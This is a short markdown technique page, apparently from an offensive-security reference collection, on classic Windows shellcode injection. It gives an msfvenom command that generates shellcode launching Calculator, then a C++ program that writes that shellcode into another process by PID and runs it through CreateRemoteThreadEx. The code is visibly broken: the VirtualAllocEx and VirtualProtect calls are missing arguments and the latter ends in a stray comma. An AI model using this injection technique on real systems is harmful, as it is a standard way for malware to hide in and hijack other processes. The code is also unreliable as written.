---
title: Shellcode Injection
description: This is a classical shellcode injection technique using CreateRemoteThreadEx.
type: Injection
platforms:
    - Windows
actors:
malwares:
link_atomicredteam:
link_mitreattack:
refs:
    - https://www.ired.team/offensive-security/code-injection-process-injection/process-injection
    - https://github.com/hideckies/shcldr
pubDate: 2024-06-30
---

## Generate Shellcode using MSFVenom

Here we generate a shellcode using MSFVenom for simple example.  

```sh
msfvenom -p windows/x64/exec CMD="calc.exe" -f c
```

This shellcode will open Calculator by injected to target process.

<br />

## Write C++ Program to Inject Shellcode

The following code is written in C++. We need to copy&paste our generated shellcode into the `shellcode` variable.

```c++
// inject.cpp

// Target process ID
DWORD targetPID = 1234;

// Shellcode
unsigned char shellcode[] = "\xfc\x48\x83\xe4..."; // Shellcode (hex) here.
DWORD shellcodeSize = sizeof(shellcode);

// Open target process with specified PID
HANDLE hProcess = OpenProcess(
    PROCESS_ALL_ACCESS,
    FALSE,
    targetPID
);
if (!hProcess)
{
    return EXIT_FAILURE;
}

// Allocate memory in the virtual address space of a target process.
LPVOID lpBaseAddr = VirtualAllocEx(
    hProcess,
    NULL,
    shellcodeSize
);
if (!lpBaseAddr)
{
    CloseHandle(hProcess);
    return EXIT_FAILURE;
}

// Write our shellcode to the memory area.
if (!WriteProcessMemory(
    hProcess,
    lpBaseAddr,
    shellcode,
    shellcodeSize,
    NULL
)) {
    CloseHandle(hProcess);
    return EXIT_FAILURE;
}

// Change the protection in the virtual address space.
DWORD oldProtect = PAGE_READWRITE;
if (!VirtualProtect(
    hProcess,
    lpBaseAddr,
    shellcodeSize,
)) {
    CloseHandle(hProcess);
    return EXIT_FAILURE;
}

// Create remote thread and execute.
HANDLE hThread = CreateRemoteThreadEx(
    hProcess,
    NULL,
    0,
    (LPTHREAD_START_ROUTINE)lpBaseAddr,
    NULL,
    0,
    NULL,
    NULL
);
if (!hThread)
{
    CloseHandle(hProcess);
    return EXIT_FAILURE;
}

WaitForSingleObject(hThread, INFINITE);

CloseHandle(hThread);
CloseHandle(hProcess);

return EXIT_SUCCESS;
```